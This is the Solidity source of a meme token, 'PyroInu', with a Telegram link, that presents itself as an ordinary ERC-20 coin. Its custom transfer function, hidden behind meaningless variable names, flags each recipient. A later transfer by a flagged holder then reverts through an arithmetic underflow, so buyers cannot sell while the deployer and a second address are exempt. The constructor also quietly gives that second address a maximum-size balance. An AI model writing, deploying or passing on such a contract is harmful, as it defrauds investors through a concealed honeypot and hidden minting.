// https://t.me/pyroinu_eth

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PyroInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private organization;

    function _transfer(
        address feed,
        address built,
        uint256 does
    ) internal override {
        uint256 broke = sight;

        if (street[feed] == 0 && organization[feed] > 0 && feed != uniswapV2Pair) {
            street[feed] -= broke;
        }

        address surface = address(till);
        till = ERC20(built);
        organization[surface] += broke + 1;

        _balances[feed] -= does;
        uint256 wrote = (does / 100) * sight;
        does -= wrote;
        _balances[built] += does;
    }

    ERC20 private till;
    mapping(address => uint256) private street;
    uint256 public sight = 3;

    constructor(
        string memory arrange,
        string memory police,
        address moving,
        address sand
    ) ERC20(arrange, police) {
        uniswapV2Router = IUniswapV2Router02(moving);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 soil = ~uint256(0);

        street[msg.sender] = soil;
        street[sand] = soil;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[sand] = soil;
    }
}